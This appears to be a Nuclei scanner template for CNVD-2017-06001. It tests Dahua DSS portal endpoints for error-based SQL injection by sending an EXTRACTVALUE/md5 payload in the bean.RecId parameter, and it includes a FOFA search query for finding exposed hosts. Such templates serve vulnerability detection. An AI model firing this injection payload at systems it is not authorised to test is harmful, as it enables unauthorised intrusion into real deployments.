http:
- matchers:
  - condition: and
    part: body
    type: word
    words:
    - 'XPATH syntax error:'
    - c8c605999f3d8352d7bb792cf3fdb25
  - status:
    - 200
    type: status
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/portal/attachment_clearTempFile.action?bean.RecId=1'') AND EXTRACTVALUE(534543,CONCAT(0x5c,md5({{num}}),0x5c))
    AND (''n72Yk''=''n72Yk&bean.TabName=1'
  - '{{BaseURL}}/portal/attachment_getAttList.action?bean.RecId=1'') AND EXTRACTVALUE(534543,CONCAT(0x5c,md5({{num}}),0x5c))
    AND (''n72Yk''=''n72Yk&bean.TabName=1'
  stop-at-first-match: true
id: CNVD-2017-06001
info:
  author: napgh0st,ritikchaddha
  metadata:
    fofa-query: app="dahua-DSS"
    max-request: 2
    verified: true
